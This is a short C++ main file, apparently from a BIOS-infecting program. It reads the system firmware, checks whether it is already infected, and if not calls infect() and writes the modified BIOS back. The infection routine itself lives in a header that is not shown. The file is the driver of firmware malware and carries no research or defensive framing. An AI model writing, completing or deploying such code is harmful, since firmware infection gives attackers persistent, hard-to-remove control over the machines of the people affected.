#include "exceptions/BiosNotReadableException.h"
#include "exceptions/BiosNotWriteableException.h"
#include "exceptions/Exception.h"
#include "Bios.h"

using namespace std;

int main() {
	Log * log = new Log();
	try {
		Bios bios(log);
		bios.read();
		if(!bios.isInfected()) {
			bios.infect();
			bios.write();
		}
	} catch (BiosNotReadableException & e) {
		log->printException(e);
		return -1;
	} catch (BiosNotWriteableException & e) {
		log->printException(e);
		return -2;
	}
	delete log;
	return 0;
}
